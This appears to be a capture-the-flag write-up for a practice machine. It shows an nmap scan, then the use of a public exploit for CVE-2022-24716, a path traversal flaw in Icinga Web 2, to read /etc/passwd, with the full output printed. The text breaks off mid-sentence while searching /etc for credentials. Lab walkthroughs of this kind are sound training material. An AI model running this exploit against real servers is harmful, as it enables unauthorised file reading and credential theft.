<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 10.10.11.205  -T4  -v -p-

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 12:12 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:12
Completed Parallel DNS resolution of 1 host. at 12:12, 0.02s elapsed
Initiating SYN Stealth Scan at 12:12
Scanning 10.10.11.205 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.205
SYN Stealth Scan Timing: About 3.26% done; ETC: 12:28 (0:15:19 remaining)
SYN Stealth Scan Timing: About 10.70% done; ETC: 12:22 (0:08:29 remaining)
SYN Stealth Scan Timing: About 23.27% done; ETC: 12:19 (0:05:00 remaining)
SYN Stealth Scan Timing: About 38.98% done; ETC: 12:18 (0:03:09 remaining)
SYN Stealth Scan Timing: About 53.43% done; ETC: 12:17 (0:02:12 remaining)
SYN Stealth Scan Timing: About 66.97% done; ETC: 12:17 (0:01:29 remaining)
SYN Stealth Scan Timing: About 77.94% done; ETC: 12:18 (0:01:12 remaining)
Completed SYN Stealth Scan at 12:17, 297.65s elapsed (65535 total ports)
Initiating Service scan at 12:17
Scanning 1 service on 10.10.11.205
Completed Service scan at 12:18, 6.42s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.11.205
Retrying OS detection (try #2) against 10.10.11.205
Initiating Traceroute at 12:18
Completed Traceroute at 12:18, 0.23s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:18
Completed Parallel DNS resolution of 2 hosts. at 12:18, 0.03s elapsed
NSE: Script scanning 10.10.11.205.
Initiating NSE at 12:18
Completed NSE at 12:18, 5.19s elapsed
Initiating NSE at 12:18
Completed NSE at 12:18, 0.77s elapsed
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Nmap scan report for 10.10.11.205
Host is up (0.18s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 7.418 days (since Sat Mar 18 02:16:12 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   214.97 ms 10.10.14.1
2   215.10 ms 10.10.11.205

NSE: Script Post-scanning.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 315.73 seconds
           Raw packets sent: 131344 (5.783MB) | Rcvd: 2048 (459.283KB)
```
From the above scan we have only one port open and that is port 8080 which runs http. So, our enumeration will be focused on this port.


<h2>Enumeration</h2>

Navigating to the webpage you get this

![image](https://user-images.githubusercontent.com/67879936/227715205-7f053439-d3a7-485c-93cd-06c715d7ada9.png)

so we'll be adding ```cinga.cerberus.local``` to our ```/etc/hosts``` file.

![image](https://user-images.githubusercontent.com/67879936/227715292-ca2816d4-9f74-407d-b32f-b0cd41c4bda5.png)

cool, now lets refresh that webpage

![image](https://user-images.githubusercontent.com/67879936/227715321-5aef8a5d-0a36-47e8-a52b-96542646737c.png)

we get this login page. Lets go look for exploits

![image](https://user-images.githubusercontent.com/67879936/227716739-37258491-9206-4d74-926c-e8fb78280884.png)

We found one, ```path transversal vulnerability```. Lets go ahead and exploit this



<h2>Exploitation</h2>

Link:https://github.com/JacobEbben/CVE-2022-24716

Download this to your machine

![image](https://user-images.githubusercontent.com/67879936/227716867-c31f29b1-6b1a-467b-8a21-c089d3d916dd.png)

those parameters are needed to make this exploit work

Lets try reading the ```/etc/passwd``` file

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/cerberus/CVE-2022-24716]
└─$ python exploit.py  http://icinga.cerberus.local:8080/icingaweb2/ /etc/passwd
/home/bl4ck4non/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.1.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
matthew:x:1000:1000:matthew:/home/matthew:/bin/bash
ntp:x:108:113::/nonexistent:/usr/sbin/nologin
sssd:x:109:115:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
nagios:x:110:118::/var/lib/nagios:/usr/sbin/nologin
redis:x:111:119::/var/lib/redis:/usr/sbin/nologin
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
icingadb:x:999:999::/etc/icingadb:/sbin/nologin
```
cool, we can view the ```/etc/passwd``` file. Lets go ahead to look for credentials we can use for the login page we found earlier. I found one in the ```etc/






























